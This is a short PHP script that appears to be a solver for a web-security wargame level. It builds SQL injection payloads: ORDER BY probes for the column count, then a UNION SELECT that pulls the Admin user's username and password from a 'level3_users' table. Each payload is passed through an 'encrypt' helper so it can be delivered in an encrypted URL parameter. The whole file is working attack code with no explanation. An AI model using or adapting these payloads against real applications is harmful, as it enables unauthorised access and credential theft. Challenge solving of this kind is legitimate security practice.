<?php

require "urlcrypt.inc";

/*
for ($i = 0; $i != 10; ++$i) {
    echo $i . ": " . encrypt("Admin' ORDER BY {$i}#") . "\n";
}
*/

$payload = "' UNION SELECT 1, 2, 3, 4, 5, 6, 7#";
echo $payload . "\n";
echo encrypt($payload) . "\n";

$payload = "' UNION SELECT 1, username, 3, 4, 5, password, 7 FROM level3_users WHERE username='Admin'#";
echo $payload . "\n";
echo encrypt($payload) . "\n";

